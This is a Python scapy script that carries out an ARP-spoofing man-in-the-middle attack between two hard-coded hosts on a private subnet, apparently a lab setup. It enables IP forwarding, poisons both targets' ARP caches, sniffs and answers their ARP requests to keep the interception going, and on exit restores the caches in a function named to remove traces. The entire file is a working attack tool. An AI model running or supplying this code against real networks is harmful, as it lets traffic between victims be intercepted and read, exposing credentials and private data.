# run this program as a super-user
import subprocess
from  scapy.all import *
import signal

target1_ip = "192.168.163.2"
target1_mac = "00:50:56:e7:1a:49"
target2_ip = "192.168.163.133"
target2_mac = "00:0c:29:9d:6e:2e"
attacker_mac = "00:0c:29:a7:96:49"



def check_ip_forwarding():
	process = subprocess.Popen(["sysctl","-n","net.ipv4.ip_forward"],stdout=subprocess.PIPE)
	output, error = process.communicate()
	# print(output) # return b'\n' format
	# print(output.decode("utf-8")) # returns the normal output as seen in terminal, but with leading sapce
	# print(len(output.decode("utf-8").strip())) # this is the output we want.NOTE, THE FINAL NUMBER WILL BE IN STRING FORMAT
	if output.decode("utf-8").strip() == "1":
		print("Ip forwarding is already enabled")
	else:
		enable_ip_forwarding()
def enable_ip_forwarding():
	process = subprocess.Popen(["sysctl","-w","net.ipv4.ip_forward=1"],stdout=subprocess.PIPE)
	output, error = process.communicate()
	if output:
		print("IP forwarding has been enabled")
	else:
		print("Error while updating IP forwarding")
def starting_MITM_arpspoofing():
	# creating an arp-response packet for target1
	pkt1 = Ether()/ARP()
	pkt1["Ethernet"].src = attacker_mac
	pkt1["Ethernet"].dst = target1_mac
	pkt1["ARP"].op = 2 # arp-reply(is at)
	pkt1["ARP"].hwsrc = attacker_mac
	pkt1["ARP"].hwdst = target1_mac
	pkt1["ARP"].psrc = target2_ip
	pkt1["ARP"].pdst = target1_ip
	print(f"Sending the spoofed packet to target 1:{sendp(pkt1)}")
	# creating an arp-response packet for target2 
	pkt2 = Ether()/ARP()
	pkt2["Ethernet"].src = attacker_mac
	pkt2["Ethernet"].dst = target2_mac
	pkt2["ARP"].op = 2 # arp-reply(is at)
	pkt2["ARP"].hwsrc = attacker_mac
	pkt2["ARP"].hwdst = target2_mac
	pkt2["ARP"].psrc = target1_ip
	pkt2["ARP"].pdst = target2_ip
	print(f"Sending the spoofed packet to target 2:{sendp(pkt2)}")
def process_packet(pkt):
	#print(pkt.show())
	# checking if the arp is an arp-request, and whether the request has been made by any one of the target's mac for the other's IP
	
	# if the target1 is arp-requesting for the ip of target2
	if(pkt["ARP"].op == 1 and pkt["Ethernet"].src == target1_mac and pkt["ARP"].hwsrc == target1_mac and pkt["ARP"].psrc == target1_ip and pkt["ARP"].pdst == target2_ip):
		print(f"Received an arp broadcast from {target1_ip}")
		# creating an arp-response packet for target1
		pkt1 = Ether()/ARP()
		pkt1["Ethernet"].src = attacker_mac
		pkt1["Ethernet"].dst = target1_mac
		pkt1["ARP"].op = 2 # arp-reply(is at)
		pkt1["ARP"].hwsrc = attacker_mac
		pkt1["ARP"].hwdst = target1_mac
		pkt1["ARP"].psrc = target2_ip
		pkt1["ARP"].pdst = target1_ip
		print(f"Sending the spoofed packet to target 1:{sendp(pkt1)}")
		
	# if the target2 is arp-requesting for the ip of target1
	if(pkt["ARP"].op == 1 and pkt["Ethernet"].src == target2_mac and pkt["ARP"].hwsrc == target2_mac and pkt["ARP"].psrc == target2_ip and pkt["ARP"].pdst == target1_ip):
		print(f"Received an arp broadcast from {target2_ip}")
		# creating an arp-response packet for target2 
		pkt2 = Ether()/ARP()
		pkt2["Ethernet"].src = attacker_mac
		pkt2["Ethernet"].dst = target2_mac
		pkt2["ARP"].op = 2 # arp-reply(is at)
		pkt2["ARP"].hwsrc = attacker_mac
		pkt2["ARP"].hwdst = target2_mac
		pkt2["ARP"].psrc = target1_ip
		pkt2["ARP"].pdst = target2_ip
		print(f"Sending the spoofed packet to target 2:{sendp(pkt2)}")

def listening_arp_request_from_targets():
	# THIS IS THE PART OF SNIFFING MODULE
	# THIS MODULE WILL RUN TILL THE ATTACKER WANTS TO QUIT AND PRESSESS CTRL+C
	# THIS IS USED TO MAINTAIN MITM ATTACK
	print("THE MAINTAINANCE MODULE HAS STARTED")
	try:
		signal.signal(signal.SIGINT, signal_handler)
		sniff(prn=process_packet,filter="arp",iface="eth0")
	except KeyboardInterrupt:
		pass
		removing_trace()
		exit(0)

def signal_handler(signal, frame):
    print("Interrupt received.")
    removing_trace()
    exit(0)
   
def removing_trace():
	# creating a correct arp-response packet for target1
	pkt1 = Ether()/ARP()
	pkt1["Ethernet"].src = target2_mac
	pkt1["Ethernet"].dst = target1_mac
	pkt1["ARP"].op = 2 # arp-reply(is at)
	pkt1["ARP"].hwsrc = target2_mac
	pkt1["ARP"].hwdst = target1_mac
	pkt1["ARP"].psrc = target2_ip
	pkt1["ARP"].pdst = target1_ip
	print(f"Sending the correct packet to target 1:{sendp(pkt1)}")
	# creating a correct arp-response packet for target2 
	pkt2 = Ether()/ARP()
	pkt2["Ethernet"].src = target1_mac
	pkt2["Ethernet"].dst = target2_mac
	pkt2["ARP"].op = 2 # arp-reply(is at)
	pkt2["ARP"].hwsrc = target1_mac
	pkt2["ARP"].hwdst = target2_mac
	pkt2["ARP"].psrc = target1_ip
	pkt2["ARP"].pdst = target2_ip
	print(f"Sending the correct packet to target 2:{sendp(pkt2)}")
check_ip_forwarding()
starting_MITM_arpspoofing()
listening_arp_request_from_targets()

